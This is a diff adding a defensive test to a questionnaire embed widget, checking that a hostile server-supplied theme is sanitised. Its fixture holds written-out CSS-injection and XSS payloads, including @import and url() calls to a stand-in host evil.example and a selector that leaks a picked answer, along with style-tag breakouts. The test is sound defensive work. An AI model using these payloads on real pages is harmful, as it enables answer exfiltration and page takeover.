@@ -14,6 +14,7 @@ import { readFileSync, readdirSync } from "node:fs";
 import path from "node:path";
 import { QaidQuests } from "./embed";
 import type { Questionnaire } from "./types";
+import { themeCssText } from "./theme-css-safety";
 
 const PAYLOADS: readonly string[] = [
   "<img src=x onerror=alert(1)>",
@@ -120,6 +121,70 @@ describe("quest text from qaid's server is drawn as text", () => {
       expect(shadow.textContent).toContain(payload);
     },
   );
+});
+
+describe("a quest theme from qaid's server cannot reach the partner page", () => {
+  // Theme tokens and CSS are written by a project member. They may restyle
+  // the card; they may not leak answers, cover the page, or break out.
+  const HOSTILE_THEME = {
+    preset: "default" as const,
+    mode: "auto" as const,
+    unstyled: false,
+    tokens: {
+      "--qaid-q-card-radius": "6px",
+      "--qaid-q-accent": "red; } :host { position: fixed; inset: 0; z-index: 2147483647 } x {",
+      "--qaid-q-bg": "url(https://evil.example/pixel.gif)",
+      "--qaid-q-font": "x</style><script>alert(1)</script>",
+    },
+    css: [
+      "@import url(https://evil.example/a.css);",
+      '.qaid-q-option[data-value^="a"][aria-checked="true"] { background: url(https://evil.example/?picked=a) }',
+      ":host { position: fixed; inset: 0; z-index: 2147483647 }",
+      ".qaid-q-card { background: u\\72l(https://evil.example/x); width: expression(alert(1)) }",
+      "</style><script>alert(1)</script>",
+      ".qaid-q-card { outline: 1px solid red }",
+    ].join("\n"),
+  };
+
+  let mount: HTMLDivElement;
+  let embed: QaidQuests | null = null;
+
+  beforeEach(() => {
+    mount = document.createElement("div");
+    mount.id = "mount";
+    document.body.appendChild(mount);
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => new Response(JSON.stringify({ id: "r1" }), { status: 200 })),
+    );
+  });
+
+  afterEach(() => {
+    embed?.destroy();
+    embed = null;
+    mount.remove();
+    vi.unstubAllGlobals();
+  });
+
+  it("keeps the harmless parts and drops the rest", async () => {
+    embed = new QaidQuests({
+      endpoint: "/api/responses",
+      questionnaire: hostile("ok", "choice"),
+      container: "#mount",
+      themeDocument: HOSTILE_THEME,
+    });
+    const shadow = (document.querySelector("[data-qaid-quests]") as HTMLElement).shadowRoot!;
+    for (let i = 0; i < 100 && !shadow.querySelector(".qaid-q-step"); i++) {
+      await new Promise((r) => setTimeout(r, 10));
+    }
+    const css = themeCssText(shadow) ?? "";
+    expect(css).toContain("--qaid-q-card-radius: 6px");
+    expect(css).toContain("outline: 1px solid red");
+    expect(css).not.toMatch(/url\(|\\72|@import|expression\(|<\/style|<script|position:\s*fixed/i);
+    expect(css).not.toContain("evil.example");
+    // Braces balance: nothing opened a rule of its own.
+    expect(css.split("{").length).toBe(css.split("}").length);
+  });
 });
 
 describe("no raw-HTML or eval sink in the embed's source", () => {
